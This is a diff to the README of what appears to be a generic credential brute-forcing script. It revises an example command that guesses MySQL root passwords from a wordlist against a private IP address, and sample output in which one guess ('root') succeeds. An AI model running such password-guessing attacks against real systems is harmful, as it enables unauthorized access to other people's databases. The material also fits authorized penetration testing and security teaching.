@@ -32,15 +32,15 @@ options:
  
 
 ## Examples
-`./universal-brute.py -u root -P passwords.txt -t 192.168.105.74 -c 'mysql -u {USER} -p{PASS} -h {TARGET} -e \\"select @@version;\\"' -s Unknown -f denied`
+`./universal-brute.py -u root -P passwords.txt -t 192.168.105.74 -c 'mysql -u {USER} -p{PASS} -h {TARGET} -e "select 1;"' -s Unknown -f denied`
 #### Output:
 ```
-[c] mysql -u root -ptest123 -h 192.168.1.1 -e \\"select @@version;\\"
+[c] mysql -u root -ptest123 -h 192.168.1.1 -e "select 1;"
 [❌] |ERROR 1045 (28000): Access denied for user 'root'@'192.168.1.1' (using password: YES)
-[c] mysql -u root -ptoor -h 192.168.1.1 -e \\"select @@version;\\"
+[c] mysql -u root -ptoor -h 192.168.1.1 -e "select 1;"
 [❌] |ERROR 1045 (28000): Access denied for user 'root'@'192.168.1.1' (using password: YES)
-[c] mysql -u root -proot -h 192.168.1.1 -e \\"select @@version;\\"
-[✅] |ERROR 1049 (42000): Unknown database '@@version;\\"'
+[c] mysql -u root -proot -h 192.168.1.1 -e "select 1;"
+[✅] |ERROR 1049 (42000): Unknown database '1'
 ```
 
 ## Todo
